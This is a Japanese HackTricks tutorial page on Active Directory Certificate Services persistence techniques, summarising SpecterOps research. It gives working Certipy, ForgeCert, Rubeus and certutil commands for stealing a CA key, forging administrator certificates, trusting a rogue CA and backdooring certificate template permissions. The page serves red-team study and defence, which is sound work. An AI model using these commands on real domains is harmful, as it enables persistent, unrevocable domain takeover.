# AD CS ドメイン永続性

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** または [telegramグループ](https://t.me/peass) に **参加** するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) を **フォロー** してください。
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出してください。

</details>

**これは、[https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)** で共有されているドメイン永続性技術の要約です。詳細については、そちらをご確認ください。

## 盗まれたCA証明書を使用した証明書の偽造 - DPERSIST1

証明書がCA証明書であるかどうかをどのように判断できますか？

証明書がCA証明書であることが確認される条件は次のとおりです：

- 証明書はCAサーバーに保存されており、そのプライベートキーはマシンのDPAPIによって保護されているか、オペレーティングシステムがサポートしている場合はTPM/HSMなどのハードウェアによって保護されています。
- 証明書の発行者とサブジェクトのフィールドがCAの識別名と一致しています。
- "CA Version" 拡張子がCA証明書にのみ存在します。
- 証明書には拡張キー使用法（EKU）フィールドがありません。

この証明書のプライベートキーを抽出するには、CAサーバー上の `certsrv.msc` ツールが組み込みGUIを介してサポートされています。ただし、この証明書はシステム内に保存されている他の証明書と変わりません。そのため、[THEFT2 技術](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) のような手法を抽出に適用することができます。

次のコマンドを使用して、Certipyを使用して証明書とプライベートキーを取得することもできます：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA証明書とその秘密鍵を`.pfx`形式で取得した後、[ForgeCert](https://github.com/GhostPack/ForgeCert)のようなツールを使用して有効な証明書を生成できます：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
証明書偽造の対象ユーザーは、プロセスが成功するためにアクティブであり、Active Directoryで認証できる必要があります。 krbtgtなどの特別なアカウントのための証明書を偽造することは効果がありません。
{% endhint %}

この偽造された証明書は、指定された終了日まで**有効**であり、ルートCA証明書が有効である限り（通常、5年から**10年以上**）、**マシン**にも有効です。これに**S4U2Self**を組み合わせることで、攻撃者はCA証明書が有効である限り、**任意のドメインマシンで持続性を維持**できます。\
さらに、この方法で生成された**証明書は**、CAがそれらを認識していないため、**取り消すことはできません**。

## ローグCA証明書を信頼する - DPERSIST2

`NTAuthCertificates`オブジェクトは、その`cacertificate`属性内に1つ以上の**CA証明書**を含むように定義されており、Active Directory（AD）が利用しています。ドメインコントローラーによる検証プロセスは、認証中の証明書の発行者フィールドに指定された**CA**に一致するエントリを`NTAuthCertificates`オブジェクトで確認します。一致が見つかった場合、認証が進行します。

攻撃者は、自己署名のCA証明書を`NTAuthCertificates`オブジェクトに追加できますが、このADオブジェクトを制御している必要があります。通常、**Enterprise Admin**グループのメンバーと、**フォレストルートのドメイン**の**Domain Admins**または**Administrators**にのみ、このオブジェクトを変更する権限が与えられます。彼らは`certutil.exe`を使用して`certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126`というコマンドを使用するか、[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)を使用して`NTAuthCertificates`オブジェクトを編集できます。

この機能は、以前にForgeCertを使用して証明書を動的に生成する方法と組み合わせて使用される場合に特に関連があります。

## 悪意のある構成ミス - DPERSIST3

**AD CS**コンポーネントの**セキュリティ記述子の変更**を通じて**持続性**を確保する機会は豊富です。"[Domain Escalation](domain-escalation.md)"セクションで説明されている変更は、昇格アクセス権を持つ攻撃者によって悪用される可能性があります。これには、以下のような重要なコンポーネントに「制御権限」（例：WriteOwner/WriteDACLなど）を追加することが含まれます：

- **CAサーバーのADコンピューター**オブジェクト
- **CAサーバーのRPC/DCOMサーバー**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`**内の**子孫ADオブジェクトまたはコンテナ**（たとえば、証明書テンプレートコンテナ、認証局コンテナ、NTAuthCertificatesオブジェクトなど）
- デフォルトでまたは組織によって（たとえば、組み込みのCert Publishersグループとそのメンバーなど）**ADグループにAD CSの制御権限が委任**されている

悪用の例として、ドメイン内で昇格権限を持つ攻撃者が、デフォルトの**`User`**証明書テンプレートに**`WriteOwner`**権限を追加し、その権限の主体として自分自身を設定することが挙げられます。これを悪用するために、攻撃者はまず**`User`**テンプレートの所有権を自分自身に変更します。その後、**`mspki-certificate-name-flag`**をテンプレートで**`ENROLLEE_SUPPLIES_SUBJECT`**を有効にするために**1**に設定し、ユーザーがリクエストでサブジェクト代替名を提供できるようにします。その後、攻撃者は**テンプレート**を使用して**登録**し、代替名として**ドメイン管理者**名を選択し、取得した証明書をDAとして認証に使用できます。
